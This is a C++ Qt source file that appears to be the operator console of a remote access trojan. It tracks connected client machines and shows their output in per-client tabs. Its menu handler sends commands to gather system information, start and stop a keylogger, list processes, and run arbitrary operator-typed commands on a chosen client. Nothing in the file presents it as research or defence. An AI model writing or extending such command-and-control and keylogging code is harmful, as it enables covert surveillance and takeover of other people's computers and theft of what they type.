#include "MainWindow.hpp"

MainWindow::MainWindow(QWidget* parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    connect(ui->selectionButton, &QPushButton::clicked,
            this, &MainWindow::onSelectionButtonClicked);

    // Pre-map default tab's list widget so we can reuse it
    const QString firstLabel = ui->tabWidget->tabText(0);
    clientTabs[firstLabel] = ui->listWidget;
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::onClientConnected(const QString& clientInfo, uint32_t sessionId)
{
    // Store session and ensure client appears in list and tab
    m_sessionIds[clientInfo] = sessionId;
    QListWidget* listWidget = ui->clientListWidget;
    for (int i = 0; i < listWidget->count(); ++i) {
        if (listWidget->item(i)->text() == clientInfo) return;
    }
    listWidget->addItem(clientInfo);
    addClientTab(clientInfo);
}

void MainWindow::addClientTab(const QString& clientId)
{
    if (clientTabs.contains(clientId)) return;
    QWidget* page = new QWidget;
    auto layout = new QVBoxLayout(page);
    layout->setContentsMargins(11, 20, 12, 49);
    QListWidget* outList = new QListWidget;
    layout->addWidget(outList);
    int idx = ui->tabWidget->addTab(page, clientId);
    ui->tabWidget->setCurrentIndex(idx);
    clientTabs[clientId] = outList;
}

void MainWindow::appendClientOutput(const QString& clientId, const QString& text)
{
    qDebug() << "[GUI] appendClientOutput for" << clientId << "len=" << text.size();
    if (!clientTabs.contains(clientId)) return;
    QListWidget* list = clientTabs[clientId];
    list->clear();
    const QStringList lines = text.split(u'\n', Qt::SkipEmptyParts);
    for (const QString& line : lines) {
        list->addItem(line);
    }
}

void MainWindow::onClientResponse(const QString& clientId, const QString& text)
{
    qDebug() << "[GUI] onClientResponse for" << clientId << "text len=" << text.size();
    appendClientOutput(clientId, text);
}

void MainWindow::executeCommand(const QString& clientId)
{
    bool ok = false;
    QString cmd = QInputDialog::getText(this, tr("Execute Command"), tr("Enter command to run on client:"),
                                        QLineEdit::Normal, QString(), &ok);
    if (ok && !cmd.isEmpty()) {
        qDebug() << "[GUI] Executing command on" << clientId << ":" << cmd;
        emit sendToClient(clientId, cmd.toUtf8());
    }
}

void MainWindow::onSelectionButtonClicked()
{
    int idx = ui->comboBox->currentIndex();
    QListWidgetItem* selectedItem = ui->clientListWidget->currentItem();
    if (!selectedItem) {
        QMessageBox::warning(this, "Warning", "Please select a client!");
        return;
    }
    QString clientId = selectedItem->text();
    qDebug() << "[GUI] onSelectionButtonClicked idx=" << idx << "client=" << clientId;

    switch (idx) {
        case 0:
            emit getInfoSys(clientId);
            break;
        case 1:
            emit startKeylogger(clientId);
            break;
        case 2:
            emit stopKeylogger(clientId);
            break;
        case 3:
            emit requestProcessList(clientId, false);
            break;
        case 4:
            emit requestProcessList(clientId, true);
            break;
        case 5:
            MainWindow::executeCommand(clientId);
            break;
        case 6:
            // Placeholder for disconnecting client
            break;
        case 7:
            // Placeholder for data analysis
            break;
        default:
            break;
    }
}
